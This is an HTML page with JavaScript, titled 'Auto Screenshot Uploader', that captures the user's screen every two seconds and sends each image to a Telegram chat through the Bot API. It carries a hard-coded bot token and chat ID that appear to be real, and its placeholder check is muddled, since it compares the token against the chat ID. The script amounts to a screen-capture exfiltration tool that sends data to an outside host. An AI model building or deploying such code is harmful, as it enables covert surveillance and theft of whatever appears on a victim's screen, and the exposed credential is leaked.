<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Screenshot & Upload</title>
    <style>
        body {
            font-family: sans-serif;
            background-color: #222;
            color: #eee;
            text-align: center;
        }
        #screenshotCanvas {
            /* Style as needed, can be hidden initially */
            border: 2px solid red; /* For visibility during development */
            max-width: 100%; /* Ensure it fits within the window */
            display: none; /* Hide initially, show only during screenshot */
        }
        #status {
            margin-top: 10px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>Auto Screenshot Uploader</h1>
    <canvas id="screenshotCanvas"></canvas>
    <div id="status"></div>

    <script>
        const TELEGRAM_BOT_TOKEN = '7785386019:AAHN8h2fje-njjcvAUUftx6TjJFE7rB4lvk';  // Replace with your bot token
        const CHAT_ID = '8101021767';            // Replace with your chat ID
        const screenshotInterval = 2000; // 2 seconds

        const canvas = document.getElementById('screenshotCanvas');
        const ctx = canvas.getContext('2d');
        const statusDiv = document.getElementById('status');

        // Error handling function
        function handleError(message, error) {
            console.error(message, error);
            statusDiv.textContent = `Error: ${message}`;
            statusDiv.style.color = 'red';
        }


        // Function to take a screenshot
        async function takeScreenshot() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                const videoTrack = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);
                const bitmap = await imageCapture.grabFrame();

                // Set canvas dimensions to match the screenshot
                canvas.width = bitmap.width;
                canvas.height = bitmap.height;
                ctx.drawImage(bitmap, 0, 0);
                videoTrack.stop(); // Stop the stream after taking the screenshot. VERY IMPORTANT!

                return new Promise((resolve, reject) => {
                    canvas.toBlob(blob => {
                        if (blob) {
                            resolve(blob);
                        } else {
                            reject(new Error('Failed to create blob from canvas.'));
                        }
                    }, 'image/png'); // Use PNG for lossless quality
                });
            } catch (error) {
               handleError("Failed to capture screenshot:", error)
               return null;  // Return null on error
            }
        }


        // Function to upload the screenshot to Telegram
        async function uploadScreenshot(blob) {
           if (!blob) {
                return; // Don't upload if blob is null (error occurred)
           }
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'screenshot.png');

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData,
                });

                const data = await response.json();
                if (data.ok) {
                    statusDiv.textContent = `Screenshot uploaded successfully at ${new Date().toLocaleTimeString()}`;
                    statusDiv.style.color = 'green';
                    console.log('Screenshot uploaded:', data);
                } else {
                   handleError("Telegram API error:", data)
                }
            } catch (error) {
                 handleError("Failed to upload screenshot:", error)
            }
        }


       // Main loop
        async function mainLoop() {
             statusDiv.textContent = "Capturing screenshot...";
             canvas.style.display = 'block'; // Show canvas briefly
             const screenshotBlob = await takeScreenshot();
             canvas.style.display = 'none'; // Hide canvas again
            await uploadScreenshot(screenshotBlob);
        }
        
        // Start the process
        if (TELEGRAM_BOT_TOKEN === '8101021767' || CHAT_ID === 'YOUR_CHAT_ID') {
            handleError("Please replace '7785386019:AAHN8h2fje-njjcvAUUftx6TjJFE7rB4lvk' and 'YOUR_CHAT_ID' with your actual Telegram bot token and chat ID.", null)
        } else
        {
            mainLoop(); // Take first screenshot immediatly
            setInterval(mainLoop, screenshotInterval); // Schedule subsequent screenshots
        }

    </script>
</body>
</html>
